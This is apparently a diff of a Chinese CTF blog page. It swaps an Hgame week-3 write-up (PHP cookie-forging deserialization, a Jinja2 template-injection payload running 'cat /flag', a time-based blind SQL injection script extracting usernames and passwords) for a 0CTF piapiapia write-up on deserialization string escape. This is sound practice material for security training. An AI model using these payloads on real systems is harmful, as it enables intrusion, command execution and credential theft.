@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>Hgameweek3 - lll-nnnのblog</title>
+  <title>BUU每日一题042 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Hgameweek3">
+            <span class="h2" id="subtitle" title="BUU每日一题042">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-24 20:15" pubdate>
-        2021年2月24日 晚上
+      <time datetime="2021-03-02 15:38" pubdate>
+        2021年3月2日 下午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      799 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      13
        分钟
     </span>
   
@@ -224,239 +224,105 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hgameweek3</h1>
+            <h1 style="display: none">BUU每日一题042</h1>
             
             <div class="markdown-body">
-              <h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>题目描述：<code>........r4u用git部署到了自己的服务器上......</code><br>提示<code>.git</code>泄露<br>githack一下得到源码     </p>
-<div class="hljs"><pre><code>//index.php
-
-&lt;?php
-error_reporting(0);
-require_once (&quot;simulator.php&quot;);
-$simulator = new Simulator();
-$cards = array();
-if(isset($_POST[&quot;draw&quot;]))&#123;
-    $cards = $simulator-&gt;draw($_POST[&quot;draw&quot;]);
-&#125;
-?&gt;
-
-//simulator.php
-
-&lt;?php
-
-class Simulator&#123;
-
-    public $session;
-    public $cardsPool;
-
-    public function __construct()&#123;
-
-        $this-&gt;session = new Session();
-        if(array_key_exists(&quot;session&quot;, $_COOKIE))&#123;
-            $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]);     #验证cookie
-        &#125;
-
-        $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;);
-        $this-&gt;cardsPool-&gt;init();
-    &#125;
-
-    public function draw($count)&#123;
-        $result = array();
-
-        for($i=0; $i&lt;$count; $i++)&#123;
-            $card = $this-&gt;cardsPool-&gt;draw();
-
-            if($card[&quot;stars&quot;] == 6)&#123;
-                $this-&gt;session-&gt;set(&#39;&#39;, $card[&quot;No&quot;]);
-            &#125;
-
-            $result[] = $card;
-        &#125;
-
-        $this-&gt;session-&gt;save();
-
-        return $result;
-    &#125;
-
-    public function getLegendary()&#123;
-        $six = array();
-
-        $data = $this-&gt;session-&gt;getAll();
-        foreach ($data as $item) &#123;
-            $six[] = $this-&gt;cardsPool-&gt;cards[6][$item];
-        &#125;
-
-        return $six;
-    &#125;
-&#125;
-
-class CardsPool
-&#123;
-
-    public $cards;
-    private $file;
-
-    public function __construct($filePath)
-    &#123;
-        if (file_exists($filePath)) &#123;
-            $this-&gt;file = $filePath;
-        &#125; else &#123;
-            die(&quot;Cards pool file doesn&#39;t exist!&quot;);
-        &#125;
-    &#125;
-
-    public function draw()
-    &#123;
-        $rand = mt_rand(1, 100);
-        $level = 0;
-
-        if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123;
-            $level = 3;
-        &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123;
-            $level = 4;
-        &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123;
-            $level = 5;
-        &#125; elseif ($rand == 100) &#123;
-            $level = 6;
-        &#125;
-
-        $rand_key = array_rand($this-&gt;cards[$level]);
-
-        return array(
-            &quot;stars&quot; =&gt; $level,
-            &quot;No&quot; =&gt; $rand_key,
-            &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key]
-        );
-    &#125;
-
-    public function init()
-    &#123;
-        $this-&gt;cards = include($this-&gt;file);
-    &#125;
-
-    public function __toString()&#123;
-        return file_get_contents($this-&gt;file);
-    &#125;
-&#125;
-
-
-class Session&#123;
-
-    private $sessionData;
-
-    const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
-
-    public function __construct()&#123;&#125;
-
-    public function set($key, $value)&#123;
-        if(empty($key))&#123;
-            $this-&gt;sessionData[] = $value;
-        &#125;else&#123;
-            $this-&gt;sessionData[$key] = $value;
-        &#125;
-    &#125;
-
-    public function getAll()&#123;
-        return $this-&gt;sessionData;
-    &#125;
-
-
-    public function save()&#123;               #生成cookie
-
-        $serialized = serialize($this-&gt;sessionData);
-        $sign = base64_encode(md5($serialized . self::SECRET_KEY));
-        $value = base64_encode($serialized) . &quot;.&quot; . $sign;
-
-        setcookie(&quot;session&quot;,$value);   
-    &#125;
-
-
-    public function extract($session)&#123;     #验证
-
-        $sess_array = explode(&quot;.&quot;, $session);
-        $data = base64_decode($sess_array[0]);
-        $sign = base64_decode($sess_array[1]);
-
-        if($sign === md5($data . self::SECRET_KEY))&#123;
-            $this-&gt;sessionData = unserialize($data);
-        &#125;else&#123;
-            unset($this-&gt;sessionData);
-            die(&quot;Go away! You hacker!&quot;);
-        &#125;
-    &#125;
-&#125;
-
-
-class Eeeeeeevallllllll&#123;
-    public $msg=&quot;坏坏liki到此一游&quot;;
-
-    public function __destruct()
-    &#123;
-        echo $this-&gt;msg;
-    &#125;
-&#125;     </code></pre></div>
-<p>通看一遍的话，主要看到几个魔法函数<br>其中：     </p>
-<div class="hljs"><pre><code>public function __toString()&#123;
-        return file_get_contents($this-&gt;file);
-    &#125;        </code></pre></div>
-<p><code>file_get_content</code>可以让我们读取文件<br>最后的echo可以触发<code>__toString</code><br>然后是那个<code>unserialize</code><br>想要反序列化，必须满足cookie<br>所以需要看cookie的生成来自己构造cookie     </p>
+              <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[0CTF 2016]piapiapia<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c2d7bb4e15e7e536.png" srcset="/img/loading.gif">    </p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>www.zip</code>泄露<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f14c9ff26da419bd.png" srcset="/img/loading.gif"><br>主要利用点：    </p>
 <div class="hljs"><pre><code>&lt;?php
-class Eeeeeeevallllllll&#123;
-    public $msg;
-&#125;
-class CardsPool&#123;
-    public $file=&quot;./flag.php&quot;;
-&#125;
-$a=new Eeeeeeevallllllll();
-$a-&gt;msg=new CardsPool();
-$b=serialize($a);
-echo $b.&quot;\n&quot;;
-$SECRET_KEY=&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
-$sign = base64_encode(md5($b . $SECRET_KEY));
-$value = base64_encode($b) . &quot;.&quot; . $sign;
-echo $value;
-?&gt;   </code></pre></div>
-<p>这个出来的和wp相比差了一些，但可以得到flag             </p>
-<p>反序列化后<code>$this-&gt;sessionData = unserialize($data);</code><br>最后触发<code>__toString</code><br>返回flag<br>..<br>..<br>..<br>…<br>还是有点懵……….先就这吧        </p>
-<h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>题目描述：<code>.........Python 写了一个 TodoList.....</code><br>模板注入<br>注册后发一个已完成的<code>&#123;&#123;7*7&#125;&#125;</code>查看后是49        </p>
-<p>过滤     </p>
-<p>包含 <code>hgame</code> 和 <code>emagh</code> 的字符串都会被替换为 <code>Stop!!!</code><br>可以以<code>base64</code>输出<br>payload:<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag | base64').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p>
-<h2 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/f2a261a9c5cd3ea3.png" srcset="/img/loading.gif"><br>一个登录界面<br>正常输入，回显是<code>WARNING! LOGIN FIALED! System is being maintained.</code>一个弹窗<br>带符号的话，回显是<code> Invalid username</code>弹窗<br>wp中<br>SQL语句是：<code>SELECT * FROM `u5ers` WHERE `usern@me`=&#39;$username&#39; and `p@ssword`=&#39;$password&#39;</code><br>然后可以用<code>\</code>转义第二个<code>&#39;</code><br><code>username=admin\</code><br><code>password=or 1=1#</code><br>原语句就变为:<code> WHERE `usern@me`=&#39;admin\&#39;or 1=1#&#39;</code><br>时间盲注：      </p>
-<p>枚举法：       </p>
-<div class="hljs"><pre><code>import requests
-import time
-import datetime
+    require_once(&#39;class.php&#39;);
+    if($_SESSION[&#39;username&#39;] == null) &#123;
+        die(&#39;Login First&#39;);    
+    &#125;
+    $username = $_SESSION[&#39;username&#39;];
+    $profile=$user-&gt;show_profile($username);
+    if($profile  == null) &#123;
+        header(&#39;Location: update.php&#39;);
+    &#125;
+    else &#123;
+        $profile = unserialize($profile);
+        $phone = $profile[&#39;phone&#39;];
+        $email = $profile[&#39;email&#39;];
+        $nickname = $profile[&#39;nickname&#39;];
+        $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));
+?&gt;       </code></pre></div>
+<p><code>file_get_contents</code><br>读取<code>config.php</code>      </p>
+<div class="hljs"><pre><code>&lt;?php
+    $config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
+    $config[&#39;username&#39;] = &#39;root&#39;;
+    $config[&#39;password&#39;] = &#39;&#39;;
+    $config[&#39;database&#39;] = &#39;&#39;;
+    $flag = &#39;&#39;;
+?&gt;       </code></pre></div>
+<p><code>update.php</code>      </p>
+<div class="hljs"><pre><code>&lt;?php
+    require_once(&#39;class.php&#39;);
+    if($_SESSION[&#39;username&#39;] == null) &#123;
+        die(&#39;Login First&#39;);    
+    &#125;
+    if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;
 
-url=&quot;https://jailbreak.liki.link/login.php&quot;
-flag=&quot;&quot;
-for i in range(1,100):
-    for j in range(31,128):
-        #payload=&quot;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)
-        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)
-        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)
-        payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(`usern@me`,0x2c,`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)
-        data=&#123;&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:payload&#125;
-        time1 = datetime.datetime.now()
-        res=requests.post(url=url,data=data)
-        time2 = datetime.datetime.now()
-        tem=(time2-time1).seconds
-        if tem&gt;2:
-            flag=flag+chr(j)
-            print(flag)
-            break
-        else:
-            j=j+1        </code></pre></div>
-<p>然后是用python fuzz过滤的符号—学到了     </p>
-<div class="hljs"><pre><code>import requests
+        $username = $_SESSION[&#39;username&#39;];
+        if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))
+            die(&#39;Invalid phone&#39;);
 
-url=&#39;https://jailbreak.liki.link/login.php&#39;
-str=&#39;WARNING! LOGIN FIALED!&#39;
-for i in range(30,128):
-    st=chr(i)
-    data=&#123;&#39;username&#39;:st,&#39;password&#39;:st&#125;
-    r=requests.post(url=url,data=data)
-    if str not in r.text:
-        print(st)</code></pre></div>
+        if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))
+            die(&#39;Invalid email&#39;);
+
+        if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
+            die(&#39;Invalid nickname&#39;);
+
+        $file = $_FILES[&#39;photo&#39;];
+        if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)
+            die(&#39;Photo size error&#39;);
+
+        move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]));
+        $profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
+        $profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
+        $profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
+        $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
+
+        $user-&gt;update_profile($username, serialize($profile));
+        echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;
+    &#125;
+    else &#123;       </code></pre></div>
+<p>有个<code>serialize</code>序列化<br><code>class.php</code>里的替换函数      </p>
+<div class="hljs"><pre><code>public function filter($string) &#123;
+    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
+    $string = preg_replace($escape, &#39;_&#39;, $string);
+
+    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
+    return preg_replace($safe, &#39;hacker&#39;, $string);
+&#125;         </code></pre></div>
+<p>where替换为hacker五位变成了六位  </p>
+<ul>
+<li><p>反序列化字符逃逸      </p>
+<div class="hljs"><pre><code>  a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;       
+  //结果       
+  Array
+  (
+      [phone] =&gt; 12345678912
+      [email] =&gt; 123456@qq.com
+      [nickname] =&gt; 123
+      [photo] =&gt; upload/562bd805ee2353360acb87cf40a48b19
+  )</code></pre></div>
+</li>
+</ul>
+<div class="hljs"><pre><code>    a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;      
+    //结果       
+    Array
+    (
+        [phone] =&gt; 12345678912
+        [email] =&gt; 123456@qq.com
+        [nickname] =&gt; 123
+        [photo] =&gt; config.php
+    )        </code></pre></div>
+<p><code>&#125;</code>提前出现，反序列化就会提前结束<br>替换会多一位，多余的位会将原来的挤出来，也就是只会根据前面的数值规定的几位来读，读到规定的位数，这一块反序列化就停止了；而多余的那部分会被认为是下一块<br><code>;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>将这一块从nickname里挤出来，就成photo里的了，然后就能读出<code>config.php</code>       </p>
+<p>nickname有长度限制可以用数组<br>数组的序列化是以<code>&#123;&#125;</code>括住的<br>所以上面的前面要加一个<code>&#125;</code>闭合数组的序列化<br><code>where*34&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>        </p>
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>在<code>update.php</code>里上传抓包<br>改nickname伪数组和其内容<br><img src="https://ftp.bmp.ovh/imgs/2021/03/ccbc2725f789e2d3.png" srcset="/img/loading.gif">     </p>
+<p>然后在<code>profile.php</code>图片的base64解码即可得到flag        </p>
 
             </div>
             <hr>
@@ -480,18 +346,12 @@ for i in range(30,128):
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/02/25/BUU037/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题037</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/02/24/BUU036/">
-                        <span class="hidden-mobile">BUU每日一题036</span>
+                      <a href="/2021/03/01/BUU041/">
+                        <span class="hidden-mobile">BUU每日一题041</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
